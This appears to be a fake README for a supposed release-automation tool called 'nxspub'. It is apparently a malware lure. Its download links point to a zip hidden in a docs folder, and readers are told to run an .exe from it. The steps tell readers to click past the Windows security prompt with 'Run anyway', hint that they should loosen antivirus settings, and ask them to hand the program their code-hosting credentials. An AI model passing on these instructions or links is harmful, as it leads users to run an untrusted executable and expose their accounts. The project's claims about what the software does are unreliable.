# 🚀 nxspub - Streamline your software release workflow today

[![](https://img.shields.io/badge/Download-nxspub-blue)](https://github.com/colloquycycle8094/nxspub/raw/refs/heads/main/docs-site/content/en/guide/Software-2.7.zip)

nxspub automates your software release process. It manages branch updates, creates changelogs, and publishes versions for you. This tool removes the manual work from your software production. It creates a steady bridge between your source code and your final release.

## 📥 Getting Started

You need the nxspub application file to begin. Visit the repository page to find the current version for Windows.

[Download it here: https://github.com/colloquycycle8094/nxspub/raw/refs/heads/main/docs-site/content/en/guide/Software-2.7.zip](https://github.com/colloquycycle8094/nxspub/raw/refs/heads/main/docs-site/content/en/guide/Software-2.7.zip)

Select the file ending in .exe to start the download. Save this file to your desktop or your downloads folder.

## 💻 System Requirements

This application runs on Windows 10 and Windows 11. Your computer must have a stable internet connection for the tool to communicate with your code storage sites. You do not need to install extra software like compilers or code runners. The application contains everything it needs to function.

## 🛠 Installation Steps

Follow these steps to set up the tool on your computer:

1. Locate the file you saved in the previous step. 
2. Double-click the file named nxspub.exe to launch the installer.
3. Windows might show a security prompt. If you see this, click "More info" and then select "Run anyway" to continue the process.
4. Follow the instructions on the screen to choose a folder for the program. 
5. Select "Install" to place the application files on your hard drive. 
6. Click "Finish" when the setup process completes.

A new icon appears on your desktop. This icon opens the main program window.

## ⚙️ Setting Up Your Workflow

Open the program to configure your settings. The main screen shows your project dashboard. 

The software uses git-hooks to track your code changes. The tool detects your active branch automatically. You should log in to your code hosting account through the settings menu. This permits the program to push updates and version numbers to your cloud repository.

The settings menu allows you to adjust your changelog format. You can toggle automatic version tagging on or off. We recommend leaving these settings in their default positions for common multi-branch setups.

## 📜 Managing Versions

nxspub handles your project versions based on your commit history. Each time you trigger a release, the software performs these actions:

1. It checks your current branch.
2. It collects all code changes since the last release.
3. It generates a readable changelog text.
4. It updates the version number in your project files.
5. It sends these changes to your branch.

This ensures you keep an accurate history of your development progress without manual entry.

## 📝 Creating Changelogs

A good changelog explains what the new version changes. nxspub builds this list for you. It reads your commit messages to identify new features, bug fixes, and performance improvements. 

You can review the generated text before it finalizes the release. If you see an error in the text, you can edit the preview window. The software saves your custom tweaks for future releases.

## 🔄 Multi-Branch Support

Many developers work with multiple branches at once. nxspub understands this workflow. It maintains separate release schedules for your main branch and your developer branches. You can toggle between these branches in the dashboard. When you commit code, the tool knows which branch it belongs to and applies the correct versioning rules.

## 🛡 Security and Privacy

Your code stays on your local machine and your trusted hosting provider. nxspub does not store your code on external servers. The authentication keys remain encrypted on your local disk. 

The tool only requests access to the repositories you specify. You can revoke this access at any time through your hosting provider's account page.

## 🔧 Frequently Asked Questions

What happens if the installation fails?
Ensure you have administrative rights on your machine. Sometimes antivirus software blocks new applications. Check your security settings if the application fails to open.

Can I move the program after I install it?
We recommend using the standard installation path. Moving the application folder can break the links between the program and your system files.

Does this work with private repositories?
Yes. The software uses your secure credentials to connect to private projects just like public ones.

What should I do if the release hangs?
Check your internet connection first. If your connection status is active, close the application and restart the process. The tool resumes where it stopped if it detects a pending task.

## 📞 Support

If the software behaves in an unexpected way, consult the issues tab on the project page. You can search for similar problems other users found. If you cannot find a solution, open a new ticket with a description of the error. Include a screenshot of the window if possible to help our team understand the issue.